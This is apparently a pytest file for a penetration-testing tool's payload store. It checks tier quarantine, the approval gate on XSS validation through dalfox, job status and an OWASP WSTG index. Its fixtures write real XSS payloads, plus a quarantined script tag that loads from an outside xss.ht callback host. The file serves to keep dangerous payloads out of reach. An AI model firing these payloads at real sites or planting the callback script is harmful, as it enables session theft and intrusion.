"""Payload store: tier enforcement, name resolution, and catalog exposure.

The property that matters most is ``test_quarantine_is_absolute``. Tier C files
hold real RCE (``exec master..xp_cmdshell``) and hardcoded callbacks to
third-party infrastructure. No configuration, and no caller opt-in, may reach
them.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from easyhunt.config import Config
from easyhunt.knowledge.payloads import PayloadError, PayloadStore, store_from_config
from easyhunt.mcp_server import load_capabilities
from easyhunt.tools.base import REGISTRY

load_capabilities()

MANIFEST = {
    "files": [
        {"name": "safe.txt", "tier": "A", "kind": "wordlist", "lines": 10,
         "sha256": "x", "get_only": False, "reasons": []},
        {"name": "stateful.txt", "tier": "A", "kind": "wordlist", "lines": 20,
         "sha256": "x", "get_only": True, "reasons": ["state-changing paths"]},
        {"name": "inject.txt", "tier": "B", "kind": "injection", "lines": 30,
         "sha256": "x", "get_only": False, "reasons": []},
        {"name": "nasty.txt", "tier": "C", "kind": "injection", "lines": 40,
         "sha256": "x", "get_only": False, "reasons": ["2 destructive/RCE statement(s)"]},
    ]
}

ALIASES = {
    "safe": {"file": "safe.txt", "tools": ["ffuf"], "purpose": "safe list"},
    "stateful": {"file": "stateful.txt", "tools": ["ffuf"], "purpose": "has /shutdown"},
    "inject": {"file": "inject.txt", "tools": ["dalfox"], "purpose": "injection"},
    "nasty": {"file": "nasty.txt", "tools": ["ffuf"], "purpose": "quarantined"},
    "dangling": {"file": "absent.txt", "tools": ["ffuf"], "purpose": "not in manifest"},
}


@pytest.fixture
def store(tmp_path) -> PayloadStore:
    (tmp_path / "manifest.json").write_text(json.dumps(MANIFEST))
    for tier, name in (("A", "safe.txt"), ("A", "stateful.txt"),
                       ("B", "inject.txt"), ("_quarantine", "nasty.txt")):
        directory = tmp_path / tier
        directory.mkdir(exist_ok=True)
        (directory / name).write_text("payload\n")
    return PayloadStore(tmp_path, ALIASES)


class TestTierEnforcement:
    def test_tier_a_resolves(self, store: PayloadStore) -> None:
        entry = store.resolve("safe")
        assert entry.tier == "A"
        assert entry.path.is_file()

    def test_tier_b_needs_explicit_opt_in(self, store: PayloadStore) -> None:
        # Injection payloads are not discovery wordlists; content_discovery must
        # not be able to reach them by naming one.
        with pytest.raises(PayloadError, match="not a discovery wordlist"):
            store.resolve("inject")
        assert store.resolve("inject", allow_tier_b=True).tier == "B"

    def test_quarantine_is_absolute(self, store: PayloadStore) -> None:
        # Not reachable by any caller, with or without opt-in. Tier C holds
        # genuine RCE and third-party callbacks.
        with pytest.raises(PayloadError, match="QUARANTINED"):
            store.resolve("nasty")
        with pytest.raises(PayloadError, match="QUARANTINED"):
            store.resolve("nasty", allow_tier_b=True)

    def test_quarantine_error_says_why(self, store: PayloadStore) -> None:
        with pytest.raises(PayloadError, match="destructive/RCE"):
            store.resolve("nasty")

    def test_unknown_name_lists_alternatives(self, store: PayloadStore) -> None:
        with pytest.raises(PayloadError, match="unknown payload list"):
            store.resolve("no-such-list")

    def test_manifest_miss_is_reported(self, store: PayloadStore) -> None:
        # An alias pointing at a file that was never vetted must fail closed,
        # not fall through to an unvetted read.
        with pytest.raises(PayloadError, match="not in the payload manifest"):
            store.resolve("dangling")

    def test_get_only_is_carried_through(self, store: PayloadStore) -> None:
        # Lists holding /shutdown, /restart are safe to GET and destructive to
        # POST. The flag has to survive resolution for the caller to honour it.
        assert store.resolve("stateful").get_only is True
        assert store.resolve("safe").get_only is False


class TestCatalog:
    def test_catalog_hides_quarantine(self, store: PayloadStore) -> None:
        assert "nasty" not in {item["name"] for item in store.catalog()}

    def test_catalog_filters_by_tool(self, store: PayloadStore) -> None:
        assert {i["name"] for i in store.catalog(tool="dalfox")} == {"inject"}

    def test_unbuilt_store_is_a_state_not_an_error(self, tmp_path) -> None:
        empty = PayloadStore(tmp_path, ALIASES)
        assert empty.available is False
        # Reports absence rather than substituting a different wordlist: swapping
        # in a list the operator did not pick changes the impact on the target.
        with pytest.raises(PayloadError, match="has not been built"):
            empty.resolve("safe")


class TestShippedConfig:
    def test_every_alias_is_tier_a(self) -> None:
        # config.yaml maps only discovery wordlists. If a tier B or C file ever
        # gets aliased there, this fails before anything fires it at a target.
        configured = store_from_config(Config.load())
        if not configured.available:
            pytest.skip("payload store not built on this machine")
        for item in configured.catalog():
            assert item["tier"] == "A", f"{item['name']} is tier {item['tier']}"

    def test_aliases_resolve_to_real_files(self) -> None:
        configured = store_from_config(Config.load())
        if not configured.available:
            pytest.skip("payload store not built on this machine")
        for item in configured.catalog():
            assert configured.resolve(item["name"]).path.is_file()


class TestCatalogTool:
    async def test_catalog_tool_is_free_and_targetless(self) -> None:
        spec = REGISTRY["payload_catalog"]
        assert spec.mode == "passive"
        assert spec.estimated_requests == 0

    async def test_catalog_tool_lists_names(self, engagement, tmp_path) -> None:
        # The fixture config carries no payloads section, so point it at a
        # purpose-built store rather than at whatever this machine happens to
        # have fetched — the test should not depend on that.
        (tmp_path / "manifest.json").write_text(json.dumps(MANIFEST))
        (tmp_path / "A").mkdir()
        (tmp_path / "A" / "safe.txt").write_text("payload\n")
        engagement.config.data["payloads"] = {
            "store": str(tmp_path),
            "lists": {"safe": ALIASES["safe"]},
        }

        result = await REGISTRY["payload_catalog"].fn()
        assert result["ok"] is True
        assert [item["name"] for item in result["lists"]] == ["safe"]

    async def test_catalog_tool_reports_an_unbuilt_store(self, engagement, tmp_path) -> None:
        # Absence must be legible, not an empty list that reads as "nothing here".
        engagement.config.data["payloads"] = {
            "store": str(tmp_path / "never-fetched"), "lists": ALIASES,
        }
        result = await REGISTRY["payload_catalog"].fn()
        assert result["ok"] is False
        assert result["error"] == "store_not_built"
        assert "vet_payloads.py --fetch" in result["message"]


class TestTierBReachability:
    """Tier B has to be reachable from the tool that owns it, and nowhere else.

    The store grew a tier B opt-in and, for a while, nothing in the server passed
    it: the lists were fetched, vetted, and unreachable, while the docs described
    an approval gate that had no caller. ``xss_validate`` is that caller — it
    hands a vetted injection list to dalfox's ``--custom-payload``. These tests
    pin both halves: the list arrives, and tier C still cannot.
    """

    TIER_B_MANIFEST = {
        "files": [
            {"name": "xsspollygots.txt", "tier": "B", "kind": "injection", "lines": 3,
             "sha256": "x", "get_only": False, "reasons": []},
            {"name": "xsswafbypss.txt", "tier": "B", "kind": "injection", "lines": 2,
             "sha256": "x", "get_only": False, "reasons": []},
            {"name": "vulJs.txt", "tier": "B", "kind": "injection", "lines": 1,
             "sha256": "x", "get_only": False, "reasons": []},
            {"name": "xss.txt", "tier": "C", "kind": "injection", "lines": 5,
             "sha256": "x", "get_only": False,
             "reasons": ["callback to GH0ST.xss.ht"]},
        ]
    }

    @pytest.fixture
    def tier_b_store(self, engagement, tmp_path):
        """A store holding the real tier B filenames, plus a tier C decoy."""
        root = tmp_path / "payload-store"
        root.mkdir()
        (root / "manifest.json").write_text(json.dumps(self.TIER_B_MANIFEST))
        (root / "B").mkdir()
        (root / "B" / "xsspollygots.txt").write_text(
            "<svg/onload=alert(1)>\n\njaVasCript:/*-/*`/**/(oNcliCk=alert())//\n<img src=x onerror=alert(1)>\n"
        )
        (root / "B" / "xsswafbypss.txt").write_text("<Svg Only=1 OnLoad=confirm(1)>\n")
        (root / "B" / "vulJs.txt").write_text("{{constructor.constructor('alert(1)')()}}\n")
        (root / "_quarantine").mkdir()
        (root / "_quarantine" / "xss.txt").write_text("<script src=//gh0st.xss.ht></script>\n")
        engagement.config.data["payloads"] = {"store": str(root), "lists": {}}
        return root

    @pytest.fixture
    def captured_dalfox(self, monkeypatch):
        """Stand in for dalfox and record the argv it would have been given."""
        from easyhunt.tools import exploitation as ex
        from easyhunt.tools.common import ToolRun

        calls: list[list[str]] = []

        async def fake_run_one(name, argv, **kwargs):
            calls.append(argv)
            return ToolRun(tool=name, ran=True, values=[], exit_code=0)

        monkeypatch.setattr(ex, "run_one", fake_run_one)
        return calls

    def _approve(self, engagement) -> None:
        from easyhunt.control_plane.approval import PolicyBackend

        engagement.approval.backend = PolicyBackend(auto_approve=["xss_validate"])

    async def test_named_list_reaches_dalfox(
        self, engagement, tier_b_store, captured_dalfox
    ) -> None:
        self._approve(engagement)
        result = await REGISTRY["xss_validate"].fn(
            target="https://www.example.com/?q=1", payload_list="xss-polyglots"
        )

        assert result["ok"] is True
        assert result["payload_list"]["tier"] == "B"
        argv = captured_dalfox[0]
        assert "--custom-payload" in argv
        # The real run_one sanitizes this argv before executing it, so a flag on
        # the allowlist that a policy rejects in practice would still be dead.
        from easyhunt.control_plane.sanitize import sanitize_argv
        from easyhunt.tools import exploitation as ex

        sanitize_argv("dalfox", argv, policy=ex.DALFOX.arg_policy)
        staged = Path(argv[argv.index("--custom-payload") + 1])
        # Staged inside the workspace: the store sits outside it, and only
        # workspace paths are mounted into the sandbox.
        assert staged.is_relative_to(engagement.workspace)
        # Copied, not rewritten — blank lines dropped, payload text untouched.
        assert staged.read_text().splitlines() == [
            "<svg/onload=alert(1)>",
            "jaVasCript:/*-/*`/**/(oNcliCk=alert())//",
            "<img src=x onerror=alert(1)>",
        ]
        # The vetted store itself stays read-only.
        assert (tier_b_store / "B" / "xsspollygots.txt").read_text().startswith("<svg/onload")

    async def test_every_shipped_name_resolves(
        self, engagement, tier_b_store, captured_dalfox
    ) -> None:
        from easyhunt.tools import exploitation as ex

        self._approve(engagement)
        for name in ex.XSS_PAYLOAD_LISTS:
            result = await REGISTRY["xss_validate"].fn(
                target="https://www.example.com/?q=1", payload_list=name
            )
            assert result["ok"] is True, f"{name}: {result.get('message')}"
            assert result["payload_list"]["tier"] == "B"

    async def test_no_list_means_no_custom_payload_flag(
        self, engagement, tier_b_store, captured_dalfox
    ) -> None:
        # The default run is unchanged: dalfox's own context-aware payloads.
        self._approve(engagement)
        result = await REGISTRY["xss_validate"].fn(target="https://www.example.com/?q=1")
        assert "payload_list" not in result
        assert "--custom-payload" not in captured_dalfox[0]

    async def test_tier_c_is_still_unreachable_from_the_tool(
        self, engagement, tier_b_store, captured_dalfox, monkeypatch
    ) -> None:
        # The manifest's own tool_map names xss.txt for xss_validate, and xss.txt
        # is quarantined for a GH0ST.xss.ht callback. Even an alias table that
        # asks for it by name is refused at resolution, and nothing is run.
        from easyhunt.tools import exploitation as ex

        monkeypatch.setitem(
            ex.XSS_PAYLOAD_LISTS, "xss-quarantined", {"file": "xss.txt", "tools": ["dalfox"]}
        )
        self._approve(engagement)
        result = await REGISTRY["xss_validate"].fn(
            target="https://www.example.com/?q=1", payload_list="xss-quarantined"
        )
        assert result["ok"] is False
        assert result["error"] == "payload_list_unavailable"
        assert "QUARANTINED" in result["message"]
        assert captured_dalfox == []

    async def test_unknown_list_reports_the_names_that_exist(
        self, engagement, tier_b_store, captured_dalfox
    ) -> None:
        from easyhunt.tools import exploitation as ex

        self._approve(engagement)
        result = await REGISTRY["xss_validate"].fn(
            target="https://www.example.com/?q=1", payload_list="no-such-list"
        )
        assert result["ok"] is False
        assert result["available"] == sorted(ex.XSS_PAYLOAD_LISTS)
        # No silent fallback to dalfox's defaults: that would run a different
        # test from the one the operator approved.
        assert captured_dalfox == []

    async def test_oversized_list_is_refused_not_truncated(
        self, engagement, tier_b_store, captured_dalfox
    ) -> None:
        from easyhunt.tools import exploitation as ex

        (tier_b_store / "B" / "vulJs.txt").write_text(
            "\n".join(f"<img src=x onerror=alert({i})>" for i in range(ex.MAX_CUSTOM_PAYLOADS + 1))
        )
        self._approve(engagement)
        result = await REGISTRY["xss_validate"].fn(
            target="https://www.example.com/?q=1", payload_list="xss-js-frameworks"
        )
        assert result["ok"] is False
        assert "over the ceiling" in result["message"]
        assert captured_dalfox == []

    async def test_the_tool_still_needs_approval(self, engagement, tier_b_store) -> None:
        from easyhunt.errors import ApprovalDenied

        # Tier B rides the existing gate on an exploit-mode tool; it does not add
        # a second one, and it must not have opened a path around the first.
        assert REGISTRY["xss_validate"].mode == "exploit"
        with pytest.raises(ApprovalDenied):
            await REGISTRY["xss_validate"].fn(
                target="https://www.example.com/?q=1", payload_list="xss-polyglots"
            )

    def test_content_discovery_cannot_name_an_injection_list(self, store: PayloadStore) -> None:
        # Two independent reasons, both worth pinning: the tier B names are not
        # in config.yaml's alias namespace at all, and even a store that knows
        # the name refuses it without the caller opt-in.
        from easyhunt.tools import exploitation as ex

        configured = store_from_config(Config.load())
        for name in ex.XSS_PAYLOAD_LISTS:
            assert name not in {item["name"] for item in configured.catalog()}
        with pytest.raises(PayloadError, match="not a discovery wordlist"):
            store.resolve("inject")

    def test_shipped_names_are_tier_b_in_the_real_manifest(self) -> None:
        # The alias table lives in code; the tier lives in the manifest. If a
        # file is ever reclassified, or renamed upstream, this fails here rather
        # than at the moment someone tries to validate a finding with it.
        from easyhunt.tools import exploitation as ex

        configured = store_from_config(Config.load())
        if not configured.available:
            pytest.skip("payload store not built on this machine")
        store = PayloadStore(configured.root, ex.XSS_PAYLOAD_LISTS)
        for name in ex.XSS_PAYLOAD_LISTS:
            entry = store.resolve(name, allow_tier_b=True)
            assert entry.tier == "B"
            assert entry.path.is_file()
            assert entry.lines <= ex.MAX_CUSTOM_PAYLOADS


class TestJobStatus:
    """Long scans hand back a job_id; something has to be able to read it.

    nuclei_scan, bbot_scan and osmedeus_flow cap their internal wait at 300s and
    return {"completed": false, "job_id": ...}. Before job_status existed no
    registered tool could fetch that result, so any scan over five minutes
    finished into a job nothing could reach.
    """

    async def test_registered_and_free(self) -> None:
        spec = REGISTRY["job_status"]
        assert spec.mode == "passive"
        assert spec.estimated_requests == 0

    async def test_lists_jobs_without_an_id(self, engagement) -> None:
        result = await REGISTRY["job_status"].fn()
        assert result["ok"] is True
        assert isinstance(result["jobs"], list)

    async def test_unknown_job_is_an_error_not_a_silent_empty(self, engagement) -> None:
        from easyhunt.errors import EasyHuntError

        with pytest.raises(EasyHuntError):
            await REGISTRY["job_status"].fn(job_id="nuclei_scan-9999")

    async def test_finished_job_returns_its_result(self, engagement) -> None:
        async def work(job):
            return {"count": 3, "findings": []}

        job = engagement.jobs.launch(work, tool="nuclei_scan", phase="vuln_scan", targets=[])
        result = await REGISTRY["job_status"].fn(job_id=job.id, wait_seconds=10.0)
        assert result["completed"] is True
        assert result["count"] == 3


class TestWstgIndex:
    """Methodology as queryable data — the gap a live engagement exposed.

    On a mature estate nuclei came back clean and the next move was improvisation.
    The WSTG names 115 tests by phase; retrieval turns "what now" into a query.
    """

    def test_index_is_built_and_attributed(self) -> None:
        from easyhunt.knowledge.wstg import load_index

        index = load_index()
        if not index.available:
            pytest.skip("WSTG index not built on this machine")
        # CC BY-SA 4.0 obliges attribution wherever the text travels.
        assert index.source["license"] == "CC BY-SA 4.0"
        assert "OWASP" in index.source["attribution"]
        assert len(index.source["commit"]) == 40, "source must be pinned"

    def test_known_tests_resolve(self) -> None:
        from easyhunt.knowledge.wstg import load_index

        index = load_index()
        if not index.available:
            pytest.skip("WSTG index not built")
        for wstg_id in ("WSTG-INPV-05", "WSTG-INPV-19", "WSTG-ATHZ-04"):
            test = index.get(wstg_id)
            assert test is not None, f"{wstg_id} missing"
            assert test["title"] and test["objectives"]

    def test_search_ranks_the_obvious_answer_first(self) -> None:
        from easyhunt.knowledge.wstg import load_index

        index = load_index()
        if not index.available:
            pytest.skip("WSTG index not built")
        assert index.search("server side request forgery")[0]["id"] == "WSTG-INPV-19"
        assert index.search("insecure direct object reference")[0]["id"] == "WSTG-ATHZ-04"

    def test_stack_hints_map_to_categories(self) -> None:
        from easyhunt.knowledge.wstg import load_index

        index = load_index()
        if not index.available:
            pytest.skip("WSTG index not built")
        # The stack actually observed on a real engagement.
        matches = index.for_stack(["Java", "Akamai", "SAML", "OAuth", "API"])
        categories = {m["category"] for m in matches}
        assert {"ATHZ", "ATHN"} & categories, "auth tests should surface for SAML/OAuth"

    def test_unknown_stack_returns_nothing_rather_than_everything(self) -> None:
        from easyhunt.knowledge.wstg import load_index

        index = load_index()
        if not index.available:
            pytest.skip("WSTG index not built")
        # Returning all 115 for an unrecognised stack would be noise pretending
        # to be guidance.
        assert index.for_stack(["CompletelyUnknownTech"]) == []

    async def test_tool_reports_a_missing_index(self, engagement, monkeypatch) -> None:
        from easyhunt.knowledge import wstg

        monkeypatch.setattr(wstg, "load_index", lambda *a, **k: wstg.WstgIndex({}))
        result = await REGISTRY["wstg_lookup"].fn(query="xss")
        assert result["ok"] is False
        assert "fetch_wstg.py --fetch" in result["message"]

    async def test_tool_is_free_and_targetless(self) -> None:
        spec = REGISTRY["wstg_lookup"]
        assert spec.mode == "passive"
        assert spec.estimated_requests == 0
